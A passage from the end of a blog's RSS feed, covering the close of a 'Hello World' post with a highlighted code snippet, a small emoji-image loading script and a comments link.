class="string">"Hello World!"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/hello-world/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
